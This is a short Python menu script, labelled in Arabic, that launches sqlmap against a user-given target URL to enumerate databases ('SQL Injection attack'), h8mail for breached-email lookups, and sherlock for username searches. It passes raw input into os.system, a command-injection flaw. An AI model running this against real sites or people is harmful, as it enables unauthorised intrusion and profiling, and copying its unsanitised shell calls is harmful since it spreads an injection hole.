import os

def menu():
    print("\n--- اجهزة مستقبل ذكية ---")
    print("1. هجوم SQL Injection")
    print("2. كشف التسريبات (Breach)")
    print("3. البحث عن الحسابات (Sherlock)")

    choice = os.getenv('CHOICE', '1')
    
    if choice == "1":
        target = input("أدخل رابط الهدف: ")
        os.system(f"python3 sqlmap/sqlmap.py -u {target} --batch --dbs")
    elif choice == "2":
        target = input("أدخل الإيميل المسرب: ")
        os.system(f"h8mail -t {target}")
    elif choice == "3":
        target = input("أدخل اسم المستخدم: ")
        os.system(f"sherlock {target}")

if __name__ == "__main__":
    menu()
